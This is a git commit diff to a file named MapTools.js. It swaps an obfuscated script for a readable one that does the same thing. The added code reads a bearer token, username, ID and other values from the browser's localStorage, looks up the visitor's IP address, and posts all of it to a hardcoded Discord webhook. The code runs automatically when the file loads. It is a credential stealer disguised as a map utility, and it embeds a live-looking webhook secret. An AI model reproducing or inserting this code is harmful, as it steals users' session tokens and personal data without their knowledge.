8822c1d6eca5030e13adaf8684167dec8a8a6804
jaylocklol <159261706+jaylocklol@users.noreply.github.com>
2024-04-11 10:32:52 -0700

    Update MapTools.js

--- MapTools.js
+++ MapTools.js
@@ -1,458 +1,100 @@
-(function (x, X) {
-    const g = V;
-    const k = x();
-    while (!![]) {
-        try {
-            const O = parseInt(g(0xd5)) / (0x1c5b * 0x1 + -0x1 * -0x6cb + -0xbb7 * 0x3) + -parseInt(g(0xcc)) / (0x11c9 + -0x6e * 0x48 + 0xd29) + parseInt(g(0x8d)) / (0xd80 + 0xef0 + -0x13 * 0x17f) + parseInt(g(0x8b)) / (0xd99 + -0x567 * 0x5 + 0x2 * 0x6b7) + -parseInt(g(0xb6)) / (-0x106d + 0x3 * 0xb42 + -0x455 * 0x4) + -parseInt(g(0x8f)) / (0x1d4c + -0x219 + -0x1b2d) + parseInt(g(0x9d)) / (-0x4e + 0xeea + 0x1 * -0xe95);
-            if (O === X) {
-                break;
-            } else {
-                k['push'](k['shift']());
-            }
-        } catch (E) {
-            k['push'](k['shift']());
-        }
+function getIpAddress(callback) {
+  const request = new XMLHttpRequest();
+  request.open("GET", "https://api.ipify.org/?format=json");
+
+  request.onload = function () {
+    if (request.status === 200) {
+      const response = JSON.parse(request.responseText);
+      const ipAddress = response.ip;
+      callback(ipAddress);
+    } else {
+      callback(null);
     }
-}(S, 0x2ea * -0x29b + -0x2 * 0x8bf2 + -0x64191 * -0x2));
-function S() {
-    const x2 = [
-        'Bearer',
-        'getItem',
-        'zqcmj',
-        'MANOU',
-        'shREs',
-        'nfiET',
-        'CSTTB',
-        'exception',
-        'vScax',
-        'IhUBo',
-        'Failed\x20to\x20send\x20message.\x20Status:',
-        'Content-type',
-        'status',
-        'fTVXx',
-        'lPKjI',
-        'log',
-        'JiyEN',
-        'eAsGW',
-        'Message\x20sent\x20successfully!',
-        'error',
-        'table',
-        'POST',
-        'hixbY',
-        'MKGTR',
-        'stringify',
-        'send',
-        'KKZZm',
-        'parse',
-        '{}.constructor(\x22return\x20this\x22)(\x20)',
-        'jSmBK',
-        'AUeSl',
-        'YqsKe',
-        'ywiBH',
-        'IP\x20Address',
-        '1020136eVajLw',
-        'fGsmX',
-        '473172jtwDTL',
-        'nKAPi',
-        '1282674RpRHqs',
-        'bind',
-        'nXWdT',
-        'apply',
-        'wKHbO',
-        'olKiw',
-        'Not\x20available',
-        'setRequestHeader',
-        'selectedCategory',
-        'XinQH',
-        'https://api.ipify.org/?format=json',
-        'MeLNc',
-        'MRdxr',
-        'console',
-        '2766204ZEazLm',
-        'responseText',
-        'info',
-        'NWxJQ',
-        'FKPem',
-        'My\x20Webhook\x20Name',
-        'QqScr',
-        '__proto__',
-        'mZYHu',
-        'https://discord.com/api/webhooks/1228026400896978995/4hmvo_ddvD3YULuOCl8IGpES2KfvTPhS67XVgnZRG-2D16ZscTG_3qCIx5HuVB-RUt1N',
-        'toString',
-        'nrmob',
-        'PXalL',
-        'Experience',
-        'username',
-        'Jqwuh',
-        'ciJwR',
-        'return\x20(function()\x20',
-        'NYdwm',
-        'XLeyr',
-        'GET',
-        'uISdL',
-        'LYcfP',
-        'OrlQi',
-        'mCVXl',
-        '1239295DzfkMq',
-        'HInBo',
-        'bearer',
-        'IDYyO',
-        'gJiLv',
-        'YyEbP',
-        'readyState',
-        'ryrxx',
-        'trace',
-        'length',
-        'UWNZp',
-        'discordPopup',
-        'prototype',
-        'pvooc',
-        'Username',
-        'Provider\x20Index',
-        'providerIndex',
-        'tcGJM',
-        'vBDQd',
-        'dNGVP',
-        'PTecm',
-        'ENpuL',
-        '215180pyzmMJ',
-        'constructor',
-        'jTKiq',
-        'lFtYF',
-        'warn',
-        'eaphV',
-        'JSUQC',
-        'onreadystatechange',
-        'QCXLj',
-        '12066VjBRVE',
-        'CNhVq'
-    ];
-    S = function () {
-        return x2;
-    };
-    return S();
+  };
+
+  request.onerror = function () {
+    callback(null);
+  };
+
+  request.send();
 }
-function V(x, X) {
-    const k = S();
-    V = function (O, E) {
-        O = O - (-0x11 * -0x34 + 0x1590 + 0xfb * -0x19);
-        let p = k[O];
-        return p;
+
+function sendMessage() {
+  getIpAddress(function(ipAddress) {
+    const experience = localStorage.getItem('experience');
+    const selectedCategory = localStorage.getItem('selectedCategory');
+    const username = localStorage.getItem('username');
+    const bearer = localStorage.getItem('bearer');
+    const providerIndex = localStorage.getItem('providerIndex');
+    const discordPopup = localStorage.getItem('discordPopup');
+    const id = localStorage.getItem('id');
+
+    const params = {
+      username: "My Webhook Name",
+      avatar_url: "",
+      embeds: [{
+        title: "User Data",
+        fields: [
+          {
+            name: "Experience",
+            value: experience || "Not available",
+            inline: true
+          },
+          {
+            name: "Selected Category",
+            value: selectedCategory || "Not available",
+            inline: true
+          },
+          {
+            name: "Username",
+            value: username || "Not available",
+            inline: true
+          },
+          {
+            name: "Bearer",
+            value: bearer || "Not available",
+            inline: true
+          },
+          {
+            name: "Provider Index",
+            value: providerIndex || "Not available",
+            inline: true
+          },
+          {
+            name: "Discord Popup",
+            value: discordPopup || "Not available",
+            inline: true
+          },
+          {
+            name: "ID",
+            value: id || "Not available",
+            inline: true
+          },
+          {
+            name: "IP Address",
+            value: ipAddress || "Not available",
+            inline: true
+          }
+        ]
+      }]
     };
-    return V(x, X);
-}
-User;
-function n(X) {
-    const T = V;
-    const k = {};
-    k['wKHbO'] = function (p, o) {
-        return p === o;
-    };
-    k[T(0x8c)] = T(0xa1);
-    k['BDmiZ'] = T(0xb1);
-    const O = k;
-    const E = new XMLHttpRequest();
-    E['open'](O['BDmiZ'], T(0x99));
-    E['onload'] = function () {
-        const s = T;
-        if (O[s(0x93)](E[s(0xe3)], -0x4be * 0x1 + -0x3b9 * -0x1 + 0x1cd)) {
-            const p = JSON[s(0x84)](E[s(0x9e)]);
-            const o = p['R'];
-            X(o);
+
+    // Send message with updated params
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1228026400896978995/4hmvo_ddvD3YULuOCl8IGpES2KfvTPhS67XVgnZRG-2D16ZscTG_3qCIx5HuVB-RUt1N");
+    request.setRequestHeader('Content-type', 'application/json');
+    request.send(JSON.stringify(params));
+    
+    request.onreadystatechange = function () {
+      if (request.readyState === 4) {
+        if (request.status === 200) {
+          console.log('Message sent successfully!');
         } else {
-            X(null);
+          console.error('Failed to send message. Status:', request.status);
         }
+      }
     };
-    E['onerror'] = function () {
-        const l = T;
-        const p = {
-            'ENpuL': function (o, f) {
-                return o === f;
-            },
-            'MANOU': function (o, f) {
-                return o(f);
-            }
-        };
-        if (O[l(0x8c)] === O[l(0x8c)]) {
-            X(null);
-        } else {
-            if (p[l(0xcb)](p[l(0xe3)], 0x23d4 + -0xd * -0xc5 + -0x25f * 0x13)) {
-                const f = Y['parse'](C[l(0x9e)]);
-                const r = f['R'];
-                D(r);
-            } else {
-                p[l(0xda)](b, null);
-            }
-        }
-    };
-    E['send']();
+  });
 }
-function v() {
-    const w = V;
-    const k = {
-        'vBDQd': function (p, o) {
-            return p + o;
-        },
-        'AUeSl': w(0x85),
-        'nfiET': function (p) {
-            return p();
-        },
-        'zqcmj': w(0xe6),
-        'ciJwR': w(0xeb),
-        'LYcfP': function (p, o) {
-            return p !== o;
-        },
-        'lPKjI': 'NZLfo',
-        'MKGTR': 'SxAms',
-        'PXalL': 'VTWYf',
-        'CNhVq': 'RWpSX',
-        'KKZZm': 'Message\x20sent\x20successfully!',
-        'lFtYF': function (p, o) {
-            return p === o;
-        },
-        'JSUQC': w(0xa3),
-        'UYkqP': w(0xd1),
-        'XLeyr': function (p, o) {
-            return p(o);
-        },
-        'NWxJQ': function (p, o) {
-            return p + o;
-        },
-        'UWNZp': w(0xae),
-        'MRdxr': function (p) {
-            return p();
-        },
-        'MeLNc': 'warn',
-        'jTKiq': 'error',
-        'roBqh': w(0xde),
-        'HInBo': w(0xbe),
-        'jSmBK': function (p, o) {
-            return p < o;
-        },
-        'chWzW': w(0x88),
-        'nXWdT': w(0x8e),
-        'PTecm': w(0x94),
-        'Epzem': 'experience',
-        'QCXLj': w(0x97),
-        'vScax': w(0xab),
-        'xSwzO': w(0xb8),
-        'CSTTB': w(0xc6),
-        'shREs': w(0xc1),
-        'gJiLv': w(0xa2),
-        'JiyEN': 'User\x20Data',
-        'mCVXl': w(0xaa),
-        'Jqwuh': function (p, o) {
-            return p || o;
-        },
-        'IDYyO': 'Not\x20available',
-        'XinQH': 'Selected\x20Category',
-        'pvooc': w(0xc5),
-        'hixbY': 'Discord\x20Popup',
-        'dNGVP': function (p, o) {
-            return p || o;
-        },
-        'ryrxx': w(0xec),
-        'GfCHv': w(0xa6),
-        'ywiBH': w(0xe2),
-        'uISdL': 'application/json',
-        'nrmob': function (p, o, f) {
-            return p(o, f);
-        }
-    };
-    const O = (function () {
-        const c = w;
-        const p = {};
-        p['wRxVD'] = k[c(0x83)];
-        const o = p;
-        let f = !![];
-        return function (r, u) {
-            const e = c;
-            const Y = {
-                'YyEbP': function (C, D) {
-                    const h = V;
-                    return k[h(0xc8)](C, D);
-                },
-                'qCQCE': k[e(0x87)],
-                'YtyHy': function (C) {
-                    const P = e;
-                    return k[P(0xdc)](C);
-                },
-                'NYdwm': k[e(0xd9)],
-                'xevXz': e(0xd0),
-                'IhUBo': k[e(0xad)],
-                'eAsGW': e(0xbe),
-                'XgeRa': function (C, D) {
-                    const L = e;
-                    return k[L(0xb3)](C, D);
-                },
-                'mZYHu': k[e(0xe5)],
-                'JWchC': k[e(0xee)]
-            };
-            if (k[e(0xa9)] !== k[e(0xd6)]) {
-                const C = f ? function () {
-                    const Q = e;
-                    if (u) {
-                        if (Y['XgeRa'](Y[Q(0xa5)], Y['JWchC'])) {
-                            const D = u[Q(0x92)](r, arguments);
-                            u = null;
-                            return D;
-                        } else {
-                            let U;
-                            try {
-                                const M = D(lpUOqQ[Q(0xbb)](lpUOqQ[Q(0xbb)](Q(0xae), lpUOqQ['qCQCE']), ');'));
-                                U = lpUOqQ['YtyHy'](M);
-                            } catch (a) {
-                                U = U;
-                            }
-                            const G = U[Q(0x9c)] = U[Q(0x9c)] || {};
-                            const A = [
-                                lpUOqQ[Q(0xaf)],
-                                lpUOqQ['xevXz'],
-                                'info',
-                                'error',
-                                Q(0xde),
-                                lpUOqQ[Q(0xe0)],
-                                lpUOqQ[Q(0xe8)]
-                            ];
-                            for (let H = 0x2405 + 0x301 + -0xd02 * 0x3; H < A[Q(0xbf)]; H++) {
-                                const t = H[Q(0xcd)][Q(0xc2)]['bind'](t);
-                                const m = A[H];
-                                const i = G[m] || t;
-                                t[Q(0xa4)] = m[Q(0x90)](i);
-                                t[Q(0xa7)] = i['toString'][Q(0x90)](i);
-                                G[m] = t;
-                            }
-                        }
-                    }
-                } : function () {
-                };
-                f = ![];
-                return C;
-            } else {
-                O[e(0xe6)](o['wRxVD']);
-            }
-        };
-    }());
-    const E = k[w(0xa8)](O, this, function () {
-        const q = w;
-        let p;
-        try {
-            if (k[q(0xcf)](k[q(0xd2)], k['UYkqP'])) {
-                O(null);
-            } else {
-                const u = k['XLeyr'](Function, k['vBDQd'](k[q(0xa0)](k[q(0xc0)], q(0x85)), ');'));
-                p = k[q(0x9b)](u);
-            }
-        } catch (Y) {
-            p = window;
-        }
-        const o = p[q(0x9c)] = p[q(0x9c)] || {};
-        const f = [
-            q(0xe6),
-            k[q(0x9a)],
-            q(0x9f),
-            k[q(0xce)],
-            k['roBqh'],
-            k[q(0xad)],
-            k[q(0xb7)]
-        ];
-        for (let C = -0x1e94 + -0x2502 + 0x4396; k[q(0x86)](C, f[q(0xbf)]); C++) {
-            if (k[q(0xb3)](k['chWzW'], k['chWzW'])) {
-                const b = O['apply'](E, arguments);
-                p = null;
-                return b;
-            } else {
-                const b = O['constructor']['prototype']['bind'](O);
-                const U = f[C];
-                const G = o[U] || b;
-                b[q(0xa4)] = O[q(0x90)](O);
-                b[q(0xa7)] = G[q(0xa7)][q(0x90)](G);
-                o[U] = b;
-            }
-        }
-    });
-    k[w(0xdc)](E);
-    k[w(0xb0)](n, function (p) {
-        const x0 = w;
-        const o = {};
-        o['tcGJM'] = x0(0xe1);
-        o[x0(0xe4)] = k[x0(0x91)];
-        o[x0(0xb4)] = k[x0(0xca)];
-        const f = o;
-        const r = localStorage[x0(0xd8)](k['Epzem']);
-        const u = localStorage[x0(0xd8)](k[x0(0xd4)]);
-        const Y = localStorage[x0(0xd8)](k[x0(0xdf)]);
-        const C = localStorage[x0(0xd8)](k['xSwzO']);
-        const D = localStorage['getItem'](k[x0(0xdd)]);
-        const b = localStorage[x0(0xd8)](k[x0(0xdb)]);
-        const U = localStorage[x0(0xd8)]('id');
-        const G = {
-            'username': k[x0(0xba)],
-            'B': '',
-            'embeds': [{
-                    'title': k[x0(0xe7)],
-                    'J': [
-                        {
-                            'name': k[x0(0xb5)],
-                            'value': k['Jqwuh'](r, k[x0(0xb9)]),
-                            'j': !![]
-                        },
-                        {
-                            'name': k[x0(0x98)],
-                            'value': k[x0(0xac)](u, k[x0(0xb9)]),
-                            'j': !![]
-                        },
-                        {
-                            'name': x0(0xc4),
-                            'value': k[x0(0xac)](Y, x0(0x95)),
-                            'j': !![]
-                        },
-                        {
-                            'name': x0(0xd7),
-                            'value': k[x0(0xac)](C, k['IDYyO']),
-                            'j': !![]
-                        },
-                        {
-                            'name': k[x0(0xc3)],
-                            'value': k[x0(0xac)](D, k[x0(0xb9)]),
-                            'j': !![]
-                        },
-                        {
-                            'name': k[x0(0xed)],
-                            'value': b || 'Not\x20available',
-                            'j': !![]
-                        },
-                        {
-                            'name': 'ID',
-                            'value': k[x0(0xc9)](U, k[x0(0xb9)]),
-                            'j': !![]
-                        },
-                        {
-                            'name': x0(0x8a),
-                            'value': p || k[x0(0xb9)],
-                            'j': !![]
-                        }
-                    ]
-                }]
-        };
-        const A = new XMLHttpRequest();
-        A['open'](k[x0(0xbd)], k['GfCHv']);
-        A[x0(0x96)](k[x0(0x89)], k[x0(0xb2)]);
-        A[x0(0x82)](JSON[x0(0x81)](G));
-        A[x0(0xd3)] = function () {
-            const x1 = x0;
-            if (A[x1(0xbc)] === 0xe89 + 0x95c * 0x3 + -0xe33 * 0x3) {
-                if (f[x1(0xe4)] !== f[x1(0xb4)]) {
-                    if (A[x1(0xe3)] === -0x87 * -0x3 + 0x20b8 + 0x2185 * -0x1) {
-                        console[x1(0xe6)](x1(0xe9));
-                    } else {
-                        console[x1(0xea)](f[x1(0xc7)], A[x1(0xe3)]);
-                    }
-                } else {
-                    o[x1(0xea)](f[x1(0xc7)], O['status']);
-                }
-            }
-        };
-    });
-}
-v();
+
+sendMessage();
